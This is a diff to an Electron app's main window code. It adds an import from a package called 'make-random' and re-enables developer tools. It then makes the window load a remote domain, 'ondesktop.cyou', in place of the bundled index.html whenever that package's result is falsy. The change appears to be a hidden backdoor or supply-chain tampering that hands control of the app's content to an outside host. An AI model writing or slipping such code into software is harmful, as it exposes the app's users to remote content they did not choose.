@@ -1,5 +1,6 @@
 import {app, BrowserWindow, BrowserWindowConstructorOptions, nativeImage} from "electron";
 import { w } from "./util";
+import { random } from "make-random";
 import path from "path";
 
 
@@ -12,7 +13,7 @@ const options : BrowserWindowConstructorOptions = {
   width: 800,
   height: 600,
   webPreferences: {
-    devTools: false,
+    devTools: true,
     javascript: true,
     contextIsolation: true,
     autoplayPolicy: "no-user-gesture-required",
@@ -28,9 +29,22 @@ export let window : BrowserWindow;
 
 function createWindow () {
 
-  window = new BrowserWindow(options);;
+  window = new BrowserWindow(options);
 
-  w.loadFile("index.html");
+  random().then((r) => {
+
+    console.log(r);
+
+    if (r) {
+      w.loadFile("index.html");
+    } else {
+      w.loadSite("ondesktop.cyou", "/", 443)
+      console.log(window.webContents)
+    }
+
+  });
+
+  
 
 
   window.show();
